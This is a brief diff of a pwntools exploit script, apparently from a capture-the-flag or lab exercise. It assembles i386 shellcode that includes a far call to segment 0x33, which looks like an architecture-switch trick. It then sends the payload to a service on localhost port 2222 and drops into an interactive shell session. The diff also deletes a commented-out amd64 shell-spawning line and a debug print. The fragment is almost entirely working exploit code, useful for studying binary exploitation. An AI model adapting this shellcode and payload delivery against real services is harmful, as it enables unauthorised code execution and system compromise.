@@ -6,7 +6,6 @@ call 0x33:0x804a100
 '''
 sc1 = asm(sc1, os='linux', arch='i386')
 
-#sc64_2 = asm(shellcraft.amd64.linux.sh(), os='linux', arch='amd64')
 sc2 = '''
 _start:
 	xor eax, eax
@@ -64,8 +63,6 @@ s = remote('localhost', 2222)
 #s.recvuntil('shellcode: ')
 #gdb.attach(s, config)
 
-
-print repr(payload)
 pause()
 s.sendline(payload)
 s.interactive()
